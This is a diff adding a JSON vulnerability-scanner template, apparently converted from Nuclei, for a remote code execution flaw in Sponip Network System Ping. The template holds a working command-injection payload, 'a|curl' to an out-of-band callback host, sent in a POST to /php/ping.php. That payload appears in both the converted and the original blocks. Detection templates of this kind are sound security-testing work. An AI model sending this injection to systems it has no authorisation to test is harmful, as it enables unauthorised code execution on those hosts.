@@ -1,0 +1,147 @@
+{
+  "id": "sponip-network-system-ping-rce",
+  "name": "Sponip Network System Ping - Remote Code Execution",
+  "author": "pikpikcu",
+  "severity": "CRITICAL",
+  "description": "Sponip Network System Ping is susceptible to remote code execution.\n",
+  "references": [
+    "https://mp.weixin.qq.com/s?__biz\u003dMzg3NDU2MTg0Ng\u003d\u003d\u0026mid\u003d2247486018\u0026idx\u003d1\u0026sn\u003dd744907475a4ea9ebeb26338c735e3e9"
+  ],
+  "tags": [
+    "sponip",
+    "rce",
+    "oast"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-77",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /php/ping.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsondata[ip]\u003da|curl {{interactsh-url}}\u0026jsondata[type]\u003d1\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "interactsh_protocol",
+          "values": [
+            "http"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "interactsh_request",
+          "values": [
+            "User-Agent: curl"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "sponip-network-system-ping-rce",
+    "info": {
+      "name": "Sponip Network System Ping - Remote Code Execution",
+      "author": "pikpikcu",
+      "severity": "critical",
+      "description": "Sponip Network System Ping is susceptible to remote code execution.\n",
+      "reference": [
+        "https://mp.weixin.qq.com/s?__biz\u003dMzg3NDU2MTg0Ng\u003d\u003d\u0026mid\u003d2247486018\u0026idx\u003d1\u0026sn\u003dd744907475a4ea9ebeb26338c735e3e9"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-77"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "sponip,rce,oast"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /php/ping.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsondata[ip]\u003da|curl {{interactsh-url}}\u0026jsondata[type]\u003d1\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "interactsh_protocol",
+            "words": [
+              "http"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "interactsh_request",
+            "words": [
+              "User-Agent: curl"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
